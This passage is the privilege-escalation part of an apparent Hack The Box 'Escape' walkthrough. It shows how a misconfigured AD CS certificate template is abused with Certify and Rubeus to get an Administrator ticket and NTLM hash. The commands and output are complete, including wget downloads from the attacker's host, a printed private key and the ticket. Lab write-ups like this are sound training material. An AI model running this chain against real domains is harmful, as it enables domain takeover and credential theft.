+</code></pre><h1 id="1a3d1b9f-8847-8187-a277-de38456e15c7" class="">Root</h1><h3 id="1a3d1b9f-8847-8066-9a0d-d98ec7e82dcc" class="">Winpeas again and enumerate groups</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-80fc-aa1d-f0dbaa6cb243" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">Current user: Ryan.Cooper
+  Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Builtin\Certificate Service DCOM Access, Network, Authenticated Users, This Organization, NTLM Authentication
+
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8060-a63f-eabba3825c2b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating machine and user certificate files
+
+  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
+  Subject            : CN=dc.sequel.htb
+  ValidDate          : 2/23/2025 8:42:32 PM
+  ExpiryDate         : 2/23/2026 8:42:32 PM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : E8E2F52B01B7F9C031D127FFFC0AF5ADD7DAF2EF
+
+  Template           : DomainController
+  Enhanced Key Usages
+       Client Authentication     [*] Certificate is used for client authentication!
+       Server Authentication
+   =================================================================================================
+
+  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
+  Subject            :
+  ValidDate          : 1/18/2024 3:03:57 PM
+  ExpiryDate         : 1/5/2074 3:03:57 PM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : D88D12AE8A50FCF12242909E3DD75CFF92D1A480
+
+  Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=2
+  Enhanced Key Usages
+       Client Authentication     [*] Certificate is used for client authentication!
+       Server Authentication
+       Smart Card Logon
+       KDC Authentication
+   =================================================================================================
+
+  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
+  Subject            :
+  ValidDate          : 11/18/2022 1:05:34 PM
+  ExpiryDate         : 11/18/2023 1:05:34 PM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : B3954D2D39DCEF1A673D6AEB9DE9116891CE57B2
+
+  Template           : Template=Kerberos Authentication(1.3.6.1.4.1.311.21.8.15399414.11998038.16730805.7332313.6448437.247.1.33), Major Version Number=110, Minor Version Number=0
+  Enhanced Key Usages
+       Client Authentication     [*] Certificate is used for client authentication!
+       Server Authentication
+       Smart Card Logon
+       KDC Authentication
+   =================================================================================================
+
+  Issuer             : CN=sequel-DC-CA, DC=sequel, DC=htb
+  Subject            : CN=sequel-DC-CA, DC=sequel, DC=htb
+  ValidDate          : 11/18/2022 12:58:46 PM
+  ExpiryDate         : 11/18/2121 1:08:46 PM
+  HasPrivateKey      : True
+  StoreLocation      : LocalMachine
+  KeyExportable      : True
+  Thumbprint         : A263EA89CAFE503BB33513E359747FD262F91A56
+
+   =================================================================================================
+
+
+</code></pre><h3 id="1a3d1b9f-8847-80ed-9336-d5bce20a99f6" class="">On group “BUILTIN\Certificate Service DCOM Access” I can exploit with <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe">certify.exe</a> and following these <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">steps</a></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-8095-ae39-e3ebd07a6bd2" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop&gt; .\Certify.exe find /vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ &#x27;__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base &#x27;CN=Configuration,DC=sequel,DC=htb&#x27;
+
+[*] Listing info about the Enterprise CA &#x27;sequel-DC-CA&#x27;
+
+    Enterprise CA Name            : sequel-DC-CA
+    DNS Hostname                  : dc.sequel.htb
+    FullName                      : dc.sequel.htb\sequel-DC-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Cert Start Date               : 11/18/2022 12:58:46 PM
+    Cert End Date                 : 11/18/2121 1:08:46 PM
+    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
+    UserSpecifiedSAN              : Disabled
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+    Enrollment Agent Restrictions : None
+
+[!] Vulnerable Certificates Templates :
+
+    CA Name                               : dc.sequel.htb\sequel-DC-CA
+    Template Name                         : UserAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+      Object Control Permissions
+        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
+                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+
+
+
+Certify completed in 00:00:09.9069745
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-802c-91ad-d0b86b7e7e28" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop&gt; ./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ &#x27;__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.0.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : sequel\Ryan.Cooper
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : UserAuthentication
+[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] AltName                 : Administrator
+
+[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 14
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpgIBAAKCAQEAz7EAEDAz3KGnEph7atcqnSjfONREwKpMZLWHCm6tEDwHF5sk
+d2NoJJehXhI18TuCwM6eB+arX6Pp5NnpocIDkVuB38CugaZCqvwDW/qxf21TyCfP
+ZtH++r/wQ78srxAy+uqbKYPrDp2JQt9T1tR4T1h56msv2tNOf3jD0BWYMJQjtGlD
+22hlf7czab6a+sWBb0aFO+it3RHIlNZnmSs6oKn7nn8uxRFFQ/ovApnPSZehfcUv
+F5YFHnupDPxSgX3oj6w+2Xw4hHl3gWv3eNOseSRxoiN29abbfnaqoj8FUipDP7+P
+z5mZZHG6QVTP40Pd34RwKyrINH5/C07ZhiJSVQIDAQABAoIBAQCUTzHbXYB7Sdgz
+eD2RgsrEZV5Zh4L9Dd71f4dKFNRyplruKXQ16P+COeEaeuiYNcXeBu1kePzhk/w+
+1rl2MEQ59V1duYsju+UZklKXyQIdG6XbZUo+gzCQQKXCyu6OqIOvF/7q+2/MBQTy
+guWsoBa1mlmc4yPOIFyKvGMf4XvHG4gSo9m8TBF6EhYzrPgya7UFuV7D+beD8R8C
+RWkLfAHE+Ww/a/83npUKvOuQzPI8GiRCQK794a5yEyiJJlXy+OZhMySolWYRC+KP
+9tnWyfsYMNtaeEkx8RpcQn1KnKwstmMJlPDzr+qTDDeg8RCFJQeJnVrZ6mEMizJL
+qcTstXMVAoGBANhWxkYGTI8CrpbWU4uGCntsUhoBFL1Wl8hDJ1VpiGawMotRuIqq
+84M7uvQzg9lTM0SHA7tRqVSf8xxw8OLrNNviemquopn+mA3TzlgCVyPlC74mx928
+25+duo8cpqiGZCMrpDqlsxVlfWclGr/vnaCg73pLlqQS4STmuo2/H7L/AoGBAPXE
+YOHQMpQmh748PRhPYtHLzVIWPC1Sr8o+dZPV/tzW5dTkbjTL41JVm1c+nAY5oTTL
+Rfo9EqU3TtzVd1GU0I+YJ0Q/c1bcYvXUwLRSm79DX3uH5cF7NiGFPEx2lGRswOF4
+5TaJvTbSjzLj0HUgoiCcIkUGlHg0CXXqdqe9ZD6rAoGBALJBTb4FErADlbfTgaNF
+Hv3zkvK6UUxxPT9VleNawXlbVUpWW6hmk59eZ/0vNUSsuWGNnhWKg+umn7qflNxk
+0Xkcc6HTo0cf8En0a+E4jHSXFcXoTmb2ZkBuxnmFMg1KLtiL7RYl0hmfNmT2vcPI
+vCjOcoRiJA2tQLYXJ0AEayohAoGBANWSqn6R5uJH+X6f6pfNpRqb+Pl0ySa5zHn8
+fUDTnn9bYK75M6w94nYSXsQabIwcWLMAUvd7S1C4F5hhCSekIvomRzlPynOZYYYw
+NKZ/g0laywcWudrBr/DBT/1CrwH2YEeQP+B9IikaIccfom+mxD2CcWV6qlsrHW2T
+Kznpo8uxAoGBAJ4M4aeYAd/T051i19IIk6ZeDbj2mQYNwe86Sbcx+mGM+FkfBbnx
+Tu0QTFZTsLwf8Gk60MUDwYauxhDShA+sKbG3O8dOAqOzOxIo1Rlp5f6FRsjHjNdY
+sUShjfYsMjp/PoBKr2kvJslUNGUZcoCQk/y1FuNLrlVc+3RgFL52zUo8
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGEjCCBPqgAwIBAgITHgAAAA7AmkzDWLVLXgAAAAAADjANBgkqhkiG9w0BAQsF
+ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUwMjI0MDYzODAxWhcNMzUwMjIy
+MDYzODAxWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
+c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
+MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDPsQAQMDPcoacSmHtq1yqdKN84
+1ETAqkxktYcKbq0QPAcXmyR3Y2gkl6FeEjXxO4LAzp4H5qtfo+nk2emhwgORW4Hf
+wK6BpkKq/ANb+rF/bVPIJ89m0f76v/BDvyyvEDL66pspg+sOnYlC31PW1HhPWHnq
+ay/a005/eMPQFZgwlCO0aUPbaGV/tzNpvpr6xYFvRoU76K3dEciU1meZKzqgqfue
+fy7FEUVD+i8Cmc9Jl6F9xS8XlgUee6kM/FKBfeiPrD7ZfDiEeXeBa/d406x5JHGi
+I3b1ptt+dqqiPwVSKkM/v4/PmZlkcbpBVM/jQ93fhHArKsg0fn8LTtmGIlJVAgMB
+AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
+lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
+KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
+CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
+hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
+Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFFqlp08Go2ft9XJFyCSK0QkIZFLu
+MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
+IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
+gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
+bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
+gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
+QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
+bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
+b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+AAOCAQEACtTjeXNhar/FJiel+gwuBrsJxOQQTx1zNX6SIjS0C+SBSK3f3T5ffBSF
+5658r7hRV6cceYDJNI6b6hmKD4c6u2HnvkqS7nUzQ+mGdw5EzRS8DobuWjIFgddP
+yWcmSQCQ5TEFNVyaUtEf4IwWqvLyzSGebqAoi6JdqMUCla47liiPbaH3WHv1CD5T
+tD4ocrgf7qs/VR3xoRfDNjeOruapNZuVWrznRaKdjLN+nROqc0lWd2BNvF9HpKvw
+kvSd2ykiOPEnX6OfMAD4DsPvd0ItLV2Uv9Ez/PYQE9lqG+znAAKJyXiqfzckS2Rb
+1W4RUxQhTIFp9vfyXIo0KkriiYvS/g==
+-----END CERTIFICATE-----
+
+
+[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
+
+
+
+Certify completed in 00:00:13.8249443
+</code></pre><h3 id="1a3d1b9f-8847-80c8-855f-f69c66f270da" class="">Put it on file on kali</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-80ce-a9ad-d8e46588866f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ nano cert.pem     </code></pre><h3 id="1a3d1b9f-8847-800f-b91a-c5e1047203a7" class="">Then convert it!</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-805a-a76a-eca041f57c8f" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Escape]
+└─$ openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx
+
+Enter Export Password:
+Verifying - Enter Export Password:
+</code></pre><h3 id="1a3d1b9f-8847-80c9-a232-edfcac061bb1" class="">Upload pfx file generated</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-80e1-87d7-f555bf4e888d" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop&gt; powershell -c wget http://10.10.14.20:8000/cert.pfx -Outfile cert.p
+fx
+</code></pre><h3 id="1a3d1b9f-8847-80eb-bafd-ff5f27a411f3" class="">Generate ticket with <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">rubeus.exe</a></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1a3d1b9f-8847-80bf-8330-f9cf678f9d2e" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">*Evil-WinRM* PS powershell -c wget http://10.10.14.20:8000/Rubeus.exe -Outfile Rubeus.exe
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop&gt; ./Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] Building AS-REQ (w/ PKINIT preauth) for: &#x27;sequel.htb\Administrator&#x27;
+[*] Using domain controller: fe80::dc3d:351a:91a7:9ef%4:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      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
+
+  ServiceName              :  krbtgt/sequel.htb
+  ServiceRealm             :  SEQUEL.HTB
+  UserName                 :  Administrator
+  UserRealm                :  SEQUEL.HTB
+  StartTime                :  2/23/2025 10:55:57 PM
+  EndTime                  :  2/24/2025 8:55:57 AM
+  RenewTill                :  3/2/2025 10:55:57 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  jeRjKXqdUZ3x2Ds+Dtkxog==
+  ASREP (key)              :  80ED3DE76A0C9870CF223B1F8FF45BE1
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
+
